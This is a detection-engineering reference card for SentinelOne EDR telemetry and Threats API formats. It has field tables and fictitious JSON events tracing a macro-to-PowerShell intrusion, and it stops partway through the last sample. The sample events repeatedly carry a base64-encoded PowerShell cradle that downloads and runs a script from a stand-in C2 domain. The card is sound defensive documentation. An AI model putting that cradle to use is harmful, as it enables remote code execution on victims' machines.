# EDR — SentinelOne Singularity (Endpoint / Complete, Deep Visibility, Singularity Data Lake)

Category: EDR · Vendor: SentinelOne · Card status: researched 2026-10-01

SentinelOne has two native shapes:

| Stream | What it is | Shape |
|---|---|---|
| **EDR telemetry** — Deep Visibility / Singularity Data Lake (SDL), exported by **Cloud Funnel 2.0** | Every process, network, DNS, file, registry, indicator event | **Flat** JSON object whose keys are **dotted strings** (`"src.process.cmdline"`, `"tgt.file.path"`, `"event.type"`) — keys literally contain dots, they are NOT nested objects |
| **Threats API** (`GET /web/api/v2.1/threats`) | The detection ("Threat") object shown in the console | Nested camelCase JSON: `threatInfo{}`, `agentRealtimeInfo{}`, `agentDetectionInfo{}`, `mitigationStatus[]`, `indicators[]` |

Platform rule: telemetry is rendered as the current SDL / Cloud Funnel 2.0 dotted-key object; detections as one
element of the Threats API `data[]` array.

---

## 1. Official / primary sources consulted

| URL | What it confirmed |
|---|---|
| https://github.com/elastic/integrations/tree/main/packages/sentinel_one_cloud_funnel/data_stream/event/_dev/test/pipeline (`test-process.log`, `test-network-action.log`, `test-dns.log`, `test-file.log`, `test-indicator.log`) | Raw Cloud Funnel 2.0 events before parsing: flat dotted keys; common keys `event.type`, `event.category`, `meta.event.name`, `event.time` (epoch ms), `event.id` (`<trace.id>_<n>`), `trace.id`, `packet.id`, `timestamp`, `account.id`, `site.id`/`site.name`, `group.id`, `agent.uuid`, `agent.version`, `endpoint.name`, `endpoint.os`, `endpoint.type`, `os.name`, `mgmt.url`, `mgmt.osRevision`, `i.scheme:"edr"`, `dataSource.name/vendor/category`, `process.unique.key`; process keys `src.process.*`, `src.process.parent.*`, `tgt.process.*` incl. `storyline.id`, `isStorylineRoot`, `uid`, `integrityLevel`, `signedStatus`, `verifiedStatus`, counters; network keys `src.ip.address`, `src.port.number`, `dst.ip.address`, `dst.port.number`, `event.network.direction` (`OUTGOING`), `event.network.connectionStatus` (`SUCCESS`), `event.network.protocolName`; DNS keys `event.dns.request`, `event.dns.response` (`"type: 5 cname;ip"`), `osSrc.process.*`; file keys `tgt.file.path`, `tgt.file.size`, `tgt.file.type`, `tgt.file.isExecutable`, `tgt.file.location`, `tgt.file.creationTime`, `tgt.file.id`; indicator keys `indicator.name`, `indicator.category`, `indicator.description`, `indicator.metadata`. Newer (2025, agent 24.4) sample uses ISO `timestamp`, spaced `event.type` (`"Process Creation"`), UUID-style `uid`/`storyline.id`, `account.name`, `dataSource.vendor`, `sca:RetentionType` |
| https://docs.sekoia.com/integration/categories/endpoint/sentinelone_cloudfunnel2.0/ | Second raw CF 2.0 source: `event.type:"Command Script"`, `cmdScript.content`, `event.dns.request`/`event.dns.response`, `event.time` epoch ms |
| https://www.blueteamsecurity.org/blog/query-forge-sentinelone-deep-visibility-fields-filters-first-hunts/ | Current S1QL/SDL query field names (`endpoint.name`, `src.process.storyline.id`, `tgt.file.sha256`, `tgt.file.extension`, `tgt.file.signature.isValid`, `url.address`, `event.url.action`, `event.dns.status`…) and src/tgt semantics |
| Search result summaries of SentinelOne Deep Visibility docs (S1 KB is login-only) | `event.type` values in spaced form: `"IP Connect"`, `"File Creation"`, `"DNS Resolved"` |
| https://github.com/elastic/integrations/blob/main/packages/sentinel_one/data_stream/threat/_dev/test/pipeline/test-pipeline-threat.log | Raw Threats API v2.1 objects: `id`, `threatInfo{analystVerdict, classification, classificationSource, confidenceLevel, detectionType, detectionEngines[], engines[], filePath, fileExtension, fileVerificationType, incidentStatus, initiatedBy, mitigationStatus, mitigationStatusDescription, originatorProcess, processUser, sha1, sha256, storyline, threatId, threatName, identifiedAt, createdAt, updatedAt…}`, `agentRealtimeInfo{agentComputerName, agentId, agentOsType, agentMitigationMode, agentNetworkStatus, networkInterfaces[]…}`, `agentDetectionInfo{agentIpV4, externalIp, agentLastLoggedInUserName, siteName, groupName…}`, `mitigationStatus[]{action, status, actionsCounters…}`, `indicators[]{category, description, ids, tactics[]}`, `containerInfo`, `kubernetesInfo`, `whiteningOptions` |
| https://xsoar.pan.dev/docs/reference/integrations/sentinel-one-v2 | Enums: analystVerdict `undefined`/`true_positive`/`false_positive`/`suspicious`; incidentStatus `unresolved`/`in_progress`/`resolved`; mitigation status filter `mitigated`/`active`/`blocked`/`suspicious`/`pending`/`suspicious_resolved`; DV query types `events, file, ip, url, dns, process, registry, scheduled_task, logins` |
| https://docs.cyderes.cloud/parser-knowledge-base/sentinel_dv/ | **Legacy** Cloud Funnel 1.0 shape (`{"event":{...},"meta":{"computer_name","agent_version","os_family","trace_id"...}}`) and legacy event names (`FileCreation`, `Tcpv4`, `Dns`, `ProcessCreation`, `RegValueModified`, `Login`) |
| https://docs.cloud.google.com/chronicle/docs/ingestion/parser-list/sentinel-dv-changelog (via search) | Legacy DV API camelCase names (`srcProcName`, `tgtFilePath`, `srcProcStorylineId`, `agentName`, `eventType`) |

Not publicly reachable: SentinelOne Knowledge Base / API docs (`usea1-*.sentinelone.net/api-doc`, login only).
Items derived only from community usage are marked **UNVERIFIED**.

---

## 2. Native format & delivery path

- **Telemetry**: agent → SentinelOne cloud → Deep Visibility / Singularity Data Lake (queried in the console:
  *Event Search* / *Visibility*, S1QL / PowerQuery). Export options: **Cloud Funnel 2.0** (continuous stream to the
  customer's S3/Azure/GCS bucket, gzip NDJSON, one flat dotted-key object per line), or the DV query API
  (`/web/api/v2.1/dv/events`, legacy camelCase result rows). We standardise on the **Cloud Funnel 2.0 / SDL object**:
  it is the current, documented raw export and its keys are identical to what analysts type in S1QL.
- **Detections**: `GET /web/api/v2.1/threats?...` → `{"data":[ <threat>, ... ],"pagination":{"nextCursor":"...","totalItems":N}}`.
  We render one element of `data[]`. (Syslog/CEF threat notifications and the newer Unified Alerts / GraphQL API
  are different shapes — not used on this card; Unified Alert native field names are **UNVERIFIED**.)

---

## 3. Core field reference

### 3a. Common telemetry keys (all CF 2.0 events)

| Key | Type | Meaning | Example / values |
|---|---|---|---|
| `event.type` | string | Event type (console name) | `Process Creation`, `Process Termination`, `IP Connect`, `IP Listen`, `DNS Resolved`, `DNS Unresolved`, `File Creation`, `File Modification`, `File Deletion`, `File Rename`, `File Scan`, `Registry Key Create`, `Registry Value Modified`, `Behavioral Indicators`, `Command Script`, `Login`, `Logout`, `Module Load`, `Open Remote Process Handle`, `Duplicate Process Handle`, `Scheduled Task Register`, `GET`/`POST` (URL) — confirmed: `Process Creation`, `IP Connect`, `DNS Resolved`, `File Creation`, `Command Script`; the rest **UNVERIFIED** spelling |
| `event.category` | string | Family | `process`, `ip`, `dns`, `file`, `registry`, `indicators`, `url`, `command_script`, `logins`, `scheduled_task`, `cross_process`, `module` |
| `meta.event.name` | string | Internal upper-case name | `PROCESSCREATION`, `TCPV4`, `DNS`, `FILECREATION`, `BEHAVIORALINDICATORS` |
| `event.time` | number (epoch ms) | Event time on endpoint | `1790669662402` |
| `timestamp` | string ISO-8601 | Same instant, ISO | `2026-09-29T08:14:22.402Z` |
| `event.id` | string | `<trace.id>_<seq>` | |
| `trace.id`, `packet.id` | string | Upload batch identifiers | |
| `agent.uuid` | string | Agent UUID (host identity) | |
| `agent.version` | string | | `25.1.3.334` |
| `endpoint.name` | string | Host name (as the agent reports it) | `FIN-WS-0142` |
| `endpoint.os` | string | `windows`, `osx`, `linux` | |
| `endpoint.type` | string | `desktop`, `laptop`, `server`, `kubernetes node` | |
| `os.name`, `mgmt.osRevision` | string | OS name / build | `Windows 11 Enterprise`, `26100` |
| `account.id`/`account.name`, `site.id`/`site.name`, `group.id` | string | Tenant scope (19-digit IDs) | |
| `mgmt.id`, `mgmt.url` | string | Management console | `euce1-108.sentinelone.net` |
| `dataSource.name` / `dataSource.vendor` / `dataSource.category` | string | `SentinelOne` / `SentinelOne` / `security` | |
| `i.scheme`, `i.version` | string | `edr`, `preprocess-lib-1.0` | |
| `process.unique.key` | string | uid of the process the event belongs to | |

### 3b. Process keys (prefixes `src.process.`, `src.process.parent.`, `tgt.process.`, `osSrc.process.`)

| Suffix | Type | Meaning |
|---|---|---|
| `name`, `displayName` | string | Image file name / version-info description |
| `pid` | number | OS PID |
| `uid` | string | S1-unique process ID (16 hex on older Windows agents; UUID on newer agents) |
| `cmdline` | string | Command line |
| `image.path`, `image.sha1`, `image.sha256`, `image.md5`, `image.binaryIsExecutable` | string/bool | Image |
| `user` | string | `DOMAIN\user` |
| `integrityLevel` | string | `SYSTEM`, `HIGH`, `MEDIUM`, `LOW`, `INTEGRITY_LEVEL_UNKNOWN` |
| `sessionId` | number | |
| `startTime` | number (epoch ms) | |
| `storyline.id` | string | Storyline (attack-chain) ID |
| `isStorylineRoot` | bool | Process started a new storyline |
| `signedStatus` / `verifiedStatus` / `publisher` | string | `signed`/`unsigned`, `verified`/`unverified`, signer |
| `subsystem` | string | `SYS_WIN32`, `SUBSYSTEM_UNKNOWN` |
| `isNative64Bit`, `isRedirectCmdProcessor` | bool | |
| counters (`src.process.` only): `childProcCount`, `netConnCount`, `netConnOutCount`, `netConnInCount`, `dnsCount`, `tgtFileCreationCount`, `tgtFileModificationCount`, `tgtFileDeletionCount`, `registryChangeCount`, `moduleCount`, `crossProcessCount`, `indicatorGeneralCount`, `indicatorEvasionCount`, `indicatorExploitationCount`, `indicatorPersistenceCount`, `indicatorInjectionCount`, `indicatorReconnaissanceCount`, `indicatorRansomwareCount`, `indicatorInfostealerCount`, `indicatorPostExploitationCount`, `indicatorBootConfigurationUpdateCount` | number | Running behaviour counters for the actor |

`src.process.*` = actor, `src.process.parent.*` = actor's parent, `tgt.process.*` = the process being created /
acted upon, `osSrc.process.*` = OS-level process that physically performed the action (e.g. `svchost.exe` Dnscache
for DNS) when S1 attributes it to a different logical source.

### 3c. Event-specific keys

| Event | Keys |
|---|---|
| IP Connect / IP Listen | `src.ip.address`, `src.port.number`, `dst.ip.address`, `dst.port.number`, `event.network.direction` (`OUTGOING`/`INCOMING`), `event.network.connectionStatus` (`SUCCESS`/`FAILURE`), `event.network.protocolName` (`tcp`, `udp`, `https`…), `event.repetitionCount` |
| DNS Resolved / Unresolved | `event.dns.request` (queried name), `event.dns.response` (`type: <qtype> <answer>;<answer>;` — e.g. `type: 5 cname.target;1.2.3.4;`), `event.dns.status` (**UNVERIFIED** values) |
| File Creation / Modification / Deletion / Rename | `tgt.file.path`, `tgt.file.name` (**UNVERIFIED** in CF2 raw, present in S1QL), `tgt.file.extension`, `tgt.file.size`, `tgt.file.type`, `tgt.file.isExecutable`, `tgt.file.location` (`Local`), `tgt.file.creationTime`, `tgt.file.modificationTime`, `tgt.file.id`, `tgt.file.sha1`/`tgt.file.sha256` (on modification/scan events; **UNVERIFIED** on creation), `tgt.file.oldPath` (rename, **UNVERIFIED**) |
| Behavioral Indicators | `indicator.name`, `indicator.category` (`General`, `Evasion`, `Exploitation`, `Persistence`, `Injection`, `Reconnaissance`, `Ransomware`, `InfoStealer`, `PostExploitation`), `indicator.description`, `indicator.metadata` |
| Command Script | `cmdScript.content`, `cmdScript.sha256`, `cmdScript.applicationName` (**UNVERIFIED**), `tgt.file.path` |
| URL | `url.address`, `event.url.action`, `event.url.source` |

### 3d. Threats API (`data[]` element)

| Field | Type | Meaning / values |
|---|---|---|
| `id` | string (19 digits) | Threat ID (same as `threatInfo.threatId`) |
| `threatInfo.threatName` | string | Usually the file name |
| `threatInfo.classification` | string | `Malware`, `Trojan`, `Ransomware`, `PUA`, `Exploit`, `Infostealer`, `Hacktool`, `Generic.Heuristic`, `Manual` … |
| `threatInfo.classificationSource` | string | `Cloud`, `Static`, `Engine`, `Behavioral` |
| `threatInfo.confidenceLevel` | string | `malicious`, `suspicious` (`n/a` for some) |
| `threatInfo.analystVerdict` (+`Description`) | string | `undefined`, `true_positive`, `false_positive`, `suspicious` |
| `threatInfo.incidentStatus` (+`Description`) | string | `unresolved`, `in_progress`, `resolved` |
| `threatInfo.mitigationStatus` (+`Description`) | string | `not_mitigated`, `mitigated`, `marked_as_benign`, `active`, `blocked`, `pending`, `suspicious_resolved` |
| `threatInfo.detectionType` | string | `static`, `dynamic` |
| `threatInfo.detectionEngines[]` (`key`,`title`) / `engines[]` | array | e.g. `{"key":"executables","title":"Behavioral AI"}`, `{"key":"sentinelone_cloud","title":"SentinelOne Cloud"}`, `{"key":"pre_execution","title":"On-Write Static AI"}` |
| `threatInfo.initiatedBy` | string | `agent_policy`, `dv_command`, `console_api`, `full_disk_scan` |
| `threatInfo.storyline` | string | Storyline ID → pivot into DV |
| `threatInfo.originatorProcess`, `processUser`, `maliciousProcessArguments`, `filePath`, `fileSize`, `fileExtension`, `fileExtensionType`, `fileVerificationType`, `publisherName`, `isFileless`, `sha1`, `sha256`, `md5` | | Threat file / process |
| `threatInfo.identifiedAt`, `createdAt`, `updatedAt` | string ISO-8601 (µs) | |
| `agentRealtimeInfo.*` | object | Current agent state: `agentComputerName`, `agentId`, `agentUuid`, `agentOsType`, `agentOsName`, `agentMachineType`, `agentMitigationMode` (`protect`/`detect`), `agentNetworkStatus` (`connected`/`disconnected`), `activeThreats`, `agentInfected`, `networkInterfaces[]`, `siteName`, `groupName`, `accountName` |
| `agentDetectionInfo.*` | object | Agent state at detection: `agentIpV4`, `externalIp`, `agentDomain`, `agentLastLoggedInUserName`, `agentLastLoggedInUpn`, `agentMitigationMode`, `agentVersion`, `siteName`, `groupName` |
| `mitigationStatus[]` | array | Per action: `action` (`kill`, `quarantine`, `remediate`, `rollback`, `network_quarantine`, `unquarantine`), `status` (`success`/`failed`), `actionsCounters`, `mitigationStartedAt`, `mitigationEndedAt` |
| `indicators[]` | array | `category`, `description`, `ids[]`, `tactics[]{name, source, techniques[]{name, link}}` |

---

## 4. Realistic JSON samples (fictitious)

Story (shared with the other EDR cards): `NEXACORP\dana.levi` on `FIN-WS-0142` opens a macro document; WINWORD
spawns encoded PowerShell → DNS → HTTPS to `cdn-update-sync.com` (185.225.73.41) → drops `msupd.exe` → Behavioral
AI kills the storyline. Windows agent shown with 16-hex `uid`/`storyline.id` (newer agents may emit UUID form —
**UNVERIFIED** for Windows).

### 4.1 Process Creation (WINWORD → encoded PowerShell)

```json
{"timestamp":"2026-09-29T08:14:22.402Z","event.time":1790669662402,"event.type":"Process Creation","event.category":"process","meta.event.name":"PROCESSCREATION","event.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD_212","trace.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD","packet.id":"4F1C9A27D3E84B6C9A0B1E2F3D4C5B6A","i.scheme":"edr","i.version":"preprocess-lib-1.0","dataSource.name":"SentinelOne","dataSource.vendor":"SentinelOne","dataSource.category":"security","account.id":"1876543210987654321","account.name":"NexaCorp","site.id":"1876543210987654400","site.name":"TLV-HQ","group.id":"1876543210987654512","mgmt.id":"30418","mgmt.url":"euce1-108.sentinelone.net","mgmt.osRevision":"26100","agent.uuid":"8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2","agent.version":"25.1.3.334","endpoint.name":"FIN-WS-0142","endpoint.os":"windows","endpoint.type":"laptop","os.name":"Windows 11 Enterprise","process.unique.key":"A41F7C3E9B2D6E08","src.process.name":"WINWORD.EXE","src.process.displayName":"Microsoft Word","src.process.pid":5216,"src.process.uid":"7D3A91E4B2D05F18","src.process.cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"","src.process.image.path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","src.process.image.sha1":"56acd2b8eef7bf2524bf0778a3830734dac894fe","src.process.image.sha256":"a80227f8606831d42d3535415b73721e08daf506051e2ec1ab7d4994d88780ca","src.process.image.md5":"b5427130eb0bcfc6bcbefd3d44f12104","src.process.image.binaryIsExecutable":true,"src.process.user":"NEXACORP\\dana.levi","src.process.integrityLevel":"MEDIUM","src.process.sessionId":1,"src.process.startTime":1790669465120,"src.process.storyline.id":"7C3A91E4B2D05F18","src.process.isStorylineRoot":true,"src.process.signedStatus":"signed","src.process.verifiedStatus":"verified","src.process.publisher":"MICROSOFT CORPORATION","src.process.subsystem":"SYS_WIN32","src.process.isNative64Bit":false,"src.process.isRedirectCmdProcessor":false,"src.process.childProcCount":1,"src.process.netConnCount":6,"src.process.dnsCount":4,"src.process.tgtFileCreationCount":3,"src.process.indicatorEvasionCount":1,"src.process.indicatorExploitationCount":1,"src.process.parent.name":"explorer.exe","src.process.parent.displayName":"Windows Explorer","src.process.parent.pid":4128,"src.process.parent.uid":"52E0B7A1C4D93F66","src.process.parent.cmdline":"C:\\Windows\\Explorer.EXE","src.process.parent.image.path":"C:\\Windows\\explorer.exe","src.process.parent.image.sha1":"bb7dbd361464a10cdb37930080c6dc87218c220e","src.process.parent.image.sha256":"2217604cf31513e40cf073832b874cd3ff50bfe3ee77ddaa7172e443501749f6","src.process.parent.image.md5":"8a64f4da916c9f0e727104dc202168a3","src.process.parent.user":"NEXACORP\\dana.levi","src.process.parent.integrityLevel":"MEDIUM","src.process.parent.sessionId":1,"src.process.parent.startTime":1790662220881,"src.process.parent.storyline.id":"52E0B7A1C4D93F66","src.process.parent.isStorylineRoot":true,"src.process.parent.signedStatus":"signed","src.process.parent.publisher":"MICROSOFT WINDOWS","src.process.parent.subsystem":"SYS_WIN32","tgt.process.name":"powershell.exe","tgt.process.displayName":"Windows PowerShell","tgt.process.pid":7412,"tgt.process.uid":"A41F7C3E9B2D6E08","tgt.process.cmdline":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","tgt.process.image.path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","tgt.process.image.sha1":"efa6e7338129ccfad7989640b6ed01e3e0c0ffdc","tgt.process.image.sha256":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","tgt.process.image.md5":"6ac5e4c66d56a4c2a2fab09e18bcc23f","tgt.process.image.binaryIsExecutable":true,"tgt.process.user":"NEXACORP\\dana.levi","tgt.process.integrityLevel":"MEDIUM","tgt.process.sessionId":1,"tgt.process.startTime":1790669662402,"tgt.process.storyline.id":"7C3A91E4B2D05F18","tgt.process.isStorylineRoot":false,"tgt.process.signedStatus":"signed","tgt.process.verifiedStatus":"verified","tgt.process.publisher":"MICROSOFT WINDOWS","tgt.process.subsystem":"SYS_WIN32","tgt.process.isNative64Bit":false,"tgt.process.isRedirectCmdProcessor":false}
```

### 4.2 DNS Resolved (PowerShell resolves C2)

```json
{"timestamp":"2026-09-29T08:14:23.051Z","event.time":1790669663051,"event.type":"DNS Resolved","event.category":"dns","meta.event.name":"DNS","event.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD_219","trace.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD","packet.id":"4F1C9A27D3E84B6C9A0B1E2F3D4C5B6A","i.scheme":"edr","i.version":"preprocess-lib-1.0","dataSource.name":"SentinelOne","dataSource.vendor":"SentinelOne","dataSource.category":"security","account.id":"1876543210987654321","account.name":"NexaCorp","site.id":"1876543210987654400","site.name":"TLV-HQ","group.id":"1876543210987654512","mgmt.id":"30418","mgmt.url":"euce1-108.sentinelone.net","mgmt.osRevision":"26100","agent.uuid":"8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2","agent.version":"25.1.3.334","endpoint.name":"FIN-WS-0142","endpoint.os":"windows","endpoint.type":"laptop","os.name":"Windows 11 Enterprise","process.unique.key":"A41F7C3E9B2D6E08","event.dns.request":"cdn-update-sync.com","event.dns.response":"type: 1 185.225.73.41;","src.process.name":"powershell.exe","src.process.displayName":"Windows PowerShell","src.process.pid":7412,"src.process.uid":"A41F7C3E9B2D6E08","src.process.cmdline":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","src.process.image.path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","src.process.image.sha1":"efa6e7338129ccfad7989640b6ed01e3e0c0ffdc","src.process.image.sha256":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","src.process.user":"NEXACORP\\dana.levi","src.process.integrityLevel":"MEDIUM","src.process.storyline.id":"7C3A91E4B2D05F18","src.process.isStorylineRoot":false,"src.process.signedStatus":"signed","src.process.startTime":1790669662402,"src.process.dnsCount":1,"src.process.parent.name":"WINWORD.EXE","src.process.parent.pid":5216,"src.process.parent.uid":"7D3A91E4B2D05F18","src.process.parent.image.path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","src.process.parent.storyline.id":"7C3A91E4B2D05F18","osSrc.process.name":"svchost.exe","osSrc.process.pid":1492,"osSrc.process.uid":"1D8E4A6B2F9C0735","osSrc.process.cmdline":"C:\\Windows\\system32\\svchost.exe -k NetworkService -p -s Dnscache","osSrc.process.image.path":"C:\\Windows\\System32\\svchost.exe","osSrc.process.user":"NT AUTHORITY\\NETWORK SERVICE","osSrc.process.integrityLevel":"SYSTEM","osSrc.process.isStorylineRoot":true}
```

### 4.3 IP Connect (outbound HTTPS to C2)

```json
{"timestamp":"2026-09-29T08:14:23.212Z","event.time":1790669663212,"event.type":"IP Connect","event.category":"ip","meta.event.name":"TCPV4","event.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD_224","trace.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD","packet.id":"4F1C9A27D3E84B6C9A0B1E2F3D4C5B6A","i.scheme":"edr","i.version":"preprocess-lib-1.0","dataSource.name":"SentinelOne","dataSource.vendor":"SentinelOne","dataSource.category":"security","account.id":"1876543210987654321","account.name":"NexaCorp","site.id":"1876543210987654400","site.name":"TLV-HQ","group.id":"1876543210987654512","mgmt.id":"30418","mgmt.url":"euce1-108.sentinelone.net","mgmt.osRevision":"26100","agent.uuid":"8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2","agent.version":"25.1.3.334","endpoint.name":"FIN-WS-0142","endpoint.os":"windows","endpoint.type":"laptop","os.name":"Windows 11 Enterprise","process.unique.key":"A41F7C3E9B2D6E08","src.ip.address":"10.20.14.87","src.port.number":52817,"dst.ip.address":"185.225.73.41","dst.port.number":443,"event.network.direction":"OUTGOING","event.network.connectionStatus":"SUCCESS","event.network.protocolName":"https","event.repetitionCount":1,"src.process.name":"powershell.exe","src.process.displayName":"Windows PowerShell","src.process.pid":7412,"src.process.uid":"A41F7C3E9B2D6E08","src.process.cmdline":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","src.process.image.path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","src.process.image.sha1":"efa6e7338129ccfad7989640b6ed01e3e0c0ffdc","src.process.image.sha256":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","src.process.user":"NEXACORP\\dana.levi","src.process.integrityLevel":"MEDIUM","src.process.sessionId":1,"src.process.startTime":1790669662402,"src.process.storyline.id":"7C3A91E4B2D05F18","src.process.isStorylineRoot":false,"src.process.signedStatus":"signed","src.process.verifiedStatus":"verified","src.process.netConnCount":1,"src.process.netConnOutCount":1,"src.process.dnsCount":1,"src.process.parent.name":"WINWORD.EXE","src.process.parent.pid":5216,"src.process.parent.uid":"7D3A91E4B2D05F18","src.process.parent.cmdline":"\"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE\" /n \"C:\\Users\\dana.levi\\Downloads\\Invoice_Q3_2026.docm\" /o \"\"","src.process.parent.image.path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","src.process.parent.storyline.id":"7C3A91E4B2D05F18","src.process.parent.isStorylineRoot":true}
```

### 4.4 File Creation (dropped payload)

```json
{"timestamp":"2026-09-29T08:14:25.880Z","event.time":1790669665880,"event.type":"File Creation","event.category":"file","meta.event.name":"FILECREATION","event.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD_241","trace.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD","packet.id":"9E2D4B6F8A1C3E5D7F9B0A2C4E6D8F1A","i.scheme":"edr","i.version":"preprocess-lib-1.0","dataSource.name":"SentinelOne","dataSource.vendor":"SentinelOne","dataSource.category":"security","account.id":"1876543210987654321","account.name":"NexaCorp","site.id":"1876543210987654400","site.name":"TLV-HQ","group.id":"1876543210987654512","mgmt.id":"30418","mgmt.url":"euce1-108.sentinelone.net","mgmt.osRevision":"26100","agent.uuid":"8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2","agent.version":"25.1.3.334","endpoint.name":"FIN-WS-0142","endpoint.os":"windows","endpoint.type":"laptop","os.name":"Windows 11 Enterprise","process.unique.key":"A41F7C3E9B2D6E08","tgt.file.path":"C:\\ProgramData\\Microsoft\\Update\\msupd.exe","tgt.file.size":318464,"tgt.file.type":"PE","tgt.file.isExecutable":true,"tgt.file.location":"Local","tgt.file.creationTime":1790669665880,"tgt.file.modificationTime":1790669665880,"tgt.file.id":"6C1E3A5F7B9D0E2C4A6F","tgt.file.isSigned":"unsigned","src.process.name":"powershell.exe","src.process.displayName":"Windows PowerShell","src.process.pid":7412,"src.process.uid":"A41F7C3E9B2D6E08","src.process.cmdline":"powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AcwB5AG4AYwAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA=","src.process.image.path":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","src.process.image.sha1":"efa6e7338129ccfad7989640b6ed01e3e0c0ffdc","src.process.image.sha256":"9cedee4eca1b34434ccdd654da4faf4c7ca7a723eaab248e4ff9717db26a1f55","src.process.user":"NEXACORP\\dana.levi","src.process.integrityLevel":"MEDIUM","src.process.startTime":1790669662402,"src.process.storyline.id":"7C3A91E4B2D05F18","src.process.isStorylineRoot":false,"src.process.signedStatus":"signed","src.process.tgtFileCreationCount":1,"src.process.netConnCount":1,"src.process.parent.name":"WINWORD.EXE","src.process.parent.pid":5216,"src.process.parent.uid":"7D3A91E4B2D05F18","src.process.parent.image.path":"C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE","src.process.parent.storyline.id":"7C3A91E4B2D05F18"}
```

(`tgt.file.type` value `PE` is **UNVERIFIED** — the only raw sample shows `UNKNOWN`; file hashes are usually
not on `File Creation`, they appear on `File Modification`/`File Scan` — **UNVERIFIED**.)

### 4.5 Behavioral Indicators (Office spawned an obfuscated script interpreter)

```json
{"timestamp":"2026-09-29T08:14:22.455Z","event.time":1790669662455,"event.type":"Behavioral Indicators","event.category":"indicators","meta.event.name":"BEHAVIORALINDICATORS","event.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD_214","trace.id":"01K6B2Q7M4X9T3V8C5N2R6P0JD","packet.id":"4F1C9A27D3E84B6C9A0B1E2F3D4C5B6A","i.scheme":"edr","i.version":"preprocess-lib-1.0","dataSource.name":"SentinelOne","dataSource.vendor":"SentinelOne","dataSource.category":"security","account.id":"1876543210987654321","account.name":"NexaCorp","site.id":"1876543210987654400","site.name":"TLV-HQ","group.id":"1876543210987654512","mgmt.id":"30418","mgmt.url":"euce1-108.sentinelone.net","mgmt.osRevision":"26100","agent.uuid":"8b3e5f2a9c1d4e7fb6a0c3d5e7f9a1b2","agent.version":"25.1.3.334","endpoint.name":"FIN-WS-0142","endpoint.os":"windows","endpoint.type":"laptop","os.name":"Windows 11 Enterprise","process.unique.key":"A41F7C3E9B2D6E08","indicator.name":"EncodedPowershellCommand","indicator.category":"Evasion","indicator.description":"Encoded PowerShell command line was executed MITRE: Defense Evasion {T1027}","indicator.metadata":"CommandLine:\"powershell.exe -nop -w hidden -enc SQBFAFgAIAAo...\",Parent:\"WINWORD.EXE\"","src.process.name":"powershell.exe","src.process.pid":7412,"src.process.uid":"A41F7C3E9B2D6E08","src.process.cmdline":"powershell.exe -nop -w hidden -enc 